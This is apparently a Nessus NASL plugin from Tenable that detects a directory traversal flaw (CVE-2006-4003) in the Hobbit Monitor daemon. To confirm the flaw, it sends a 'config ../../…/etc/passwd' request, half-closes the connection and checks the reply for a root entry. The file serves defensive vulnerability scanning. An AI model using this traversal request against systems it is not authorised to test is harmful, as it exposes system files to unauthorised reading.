#
# (C) Tenable Network Security
#


if (NASL_LEVEL < 2202) exit(0);


  desc = "
Synopsis :

The remote server is affected by an information disclosure
vulnerability. 

Description :

The version of the Hobbit Monitor daemon installed on the remote host
does not properly filter the argument to the 'config' command of
directory traversal sequences.  An unauthenticated attacker can
leverage this flaw to retrieve arbitrary files from the affected host
subject to the privileges of the user id under which hobbitd runs. 

See also :

http://www.securityfocus.com/archive/1/442036/30/0/threaded

Solution :

Upgrade to Hobbit version 4.1.2p2 or later.

Risk factor :

Low / CVSS Base Score : 2.3
(AV:R/AC:L/Au:NR/C:P/I:N/A:N/B:N)";


if (description)
{
  script_id(22181);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2006-4003");
  script_bugtraq_id(19317);

  script_name(english:"Hobbit Monitor config Command Directory Traversal Vulnerability");
  script_summary(english:"Tries to read a local file using hobbitd");
 
  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"Misc.");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("hobbitd_detect.nasl");
  script_require_ports("Services/hobbitd", 1984);

  exit(0);
}



include("raw.inc");


port = get_kb_item("Services/hobbitd");
if (!port) port = 1984;
if (!get_port_state(port)) exit(0);


soc = open_sock_tcp(port);
if (!soc) exit(0);


# Try to exploit the flaw to retrieve a local file.
file = "../../../../../../../../../../etc/passwd";
filter = string("tcp and src ", get_host_ip(), " and src port ", port);
res = send_capture(socket:soc, data:string("config ", file), pcap_filter:filter);
if (res == NULL) exit(0);
flags = get_tcp_element(tcp:res, element:"th_flags");
if (flags & TH_ACK == 0) exit(0);


# Half-close the connection so the server will send the results.
ip = ip();
seq = get_tcp_element(tcp:res, element:"th_ack");
tcp = tcp(
  th_dport : port,
  th_sport : get_source_port(soc),
  th_seq   : seq,
  th_ack   : seq,
  th_win   : get_tcp_element(tcp:res, element:"th_win"),
  th_flags : TH_FIN|TH_ACK
);
halfclose = mkpacket(ip, tcp);
send_packet(halfclose, pcap_active:FALSE);
res = recv(socket:soc, length:65535);
if (res == NULL) exit(0);


# There's a problem if there's an entry for root.
if (egrep(pattern:"root:.*:0:[01]:", string:res))
{
  report = string(
    desc,
    "\n\n",
    "Plugin output :\n",
    "\n",
    "Here are the repeated contents of the file '/etc/passwd'\n",
    "that Nessus was able to read from the remote host :\n",
    "\n",
    res
  );
  security_note(port:port, data:report);
}
